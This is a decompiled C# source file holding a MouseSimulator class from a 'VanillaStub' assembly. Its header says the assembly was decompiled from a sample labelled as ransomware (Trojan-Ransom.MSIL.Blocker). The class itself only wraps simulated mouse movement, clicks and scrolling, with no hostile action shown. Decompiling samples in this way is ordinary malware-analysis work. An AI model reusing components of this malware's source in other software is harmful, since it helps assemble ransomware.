// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.InputSimulator.MouseSimulator
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Threading;
using VanillaStub.Helpers.Services.InputSimulator.Native;

namespace VanillaStub.Helpers.Services.InputSimulator
{
  public class MouseSimulator : IMouseSimulator
  {
    private const int MouseWheelClickSize = 120;
    private readonly IInputSimulator _inputSimulator;
    private readonly IInputMessageDispatcher _messageDispatcher;

    public MouseSimulator(IInputSimulator inputSimulator)
    {
      this._inputSimulator = inputSimulator != null ? inputSimulator : throw new ArgumentNullException(nameof (inputSimulator));
      this._messageDispatcher = (IInputMessageDispatcher) new WindowsInputMessageDispatcher();
    }

    internal MouseSimulator(
      IInputSimulator inputSimulator,
      IInputMessageDispatcher messageDispatcher)
    {
      if (inputSimulator == null)
        throw new ArgumentNullException(nameof (inputSimulator));
      if (messageDispatcher == null)
        throw new InvalidOperationException(string.Format("The {0} cannot operate with a null {1}. Please provide a valid {1} instance to use for dispatching {2} messages.", (object) typeof (MouseSimulator).Name, (object) typeof (IInputMessageDispatcher).Name, (object) typeof (INPUT).Name));
      this._inputSimulator = inputSimulator;
      this._messageDispatcher = messageDispatcher;
    }

    public IKeyboardSimulator Keyboard => this._inputSimulator.Keyboard;

    public IMouseSimulator MoveMouseBy(int pixelDeltaX, int pixelDeltaY)
    {
      this.SendSimulatedInput(new InputBuilder().AddRelativeMouseMovement(pixelDeltaX, pixelDeltaY).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator MoveMouseTo(double absoluteX, double absoluteY)
    {
      this.SendSimulatedInput(new InputBuilder().AddAbsoluteMouseMovement((int) Math.Truncate(absoluteX), (int) Math.Truncate(absoluteY)).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator MoveMouseToPositionOnVirtualDesktop(
      double absoluteX,
      double absoluteY)
    {
      this.SendSimulatedInput(new InputBuilder().AddAbsoluteMouseMovementOnVirtualDesktop((int) Math.Truncate(absoluteX), (int) Math.Truncate(absoluteY)).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator LeftButtonDown()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonDown(MouseButton.LeftButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator LeftButtonUp()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonUp(MouseButton.LeftButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator LeftButtonClick()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonClick(MouseButton.LeftButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator LeftButtonDoubleClick()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonDoubleClick(MouseButton.LeftButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator RightButtonDown()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonDown(MouseButton.RightButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator RightButtonUp()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonUp(MouseButton.RightButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator RightButtonClick()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonClick(MouseButton.RightButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator RightButtonDoubleClick()
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseButtonDoubleClick(MouseButton.RightButton).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator XButtonDown(int buttonId)
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseXButtonDown(buttonId).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator XButtonUp(int buttonId)
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseXButtonUp(buttonId).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator XButtonClick(int buttonId)
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseXButtonClick(buttonId).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator XButtonDoubleClick(int buttonId)
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseXButtonDoubleClick(buttonId).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator VerticalScroll(int scrollAmountInClicks)
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseVerticalWheelScroll(scrollAmountInClicks * 120).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator HorizontalScroll(int scrollAmountInClicks)
    {
      this.SendSimulatedInput(new InputBuilder().AddMouseHorizontalWheelScroll(scrollAmountInClicks * 120).ToArray());
      return (IMouseSimulator) this;
    }

    public IMouseSimulator Sleep(int millsecondsTimeout)
    {
      Thread.Sleep(millsecondsTimeout);
      return (IMouseSimulator) this;
    }

    public IMouseSimulator Sleep(TimeSpan timeout)
    {
      Thread.Sleep(timeout);
      return (IMouseSimulator) this;
    }

    private void SendSimulatedInput(INPUT[] inputList) => this._messageDispatcher.DispatchInput(inputList);
  }
}
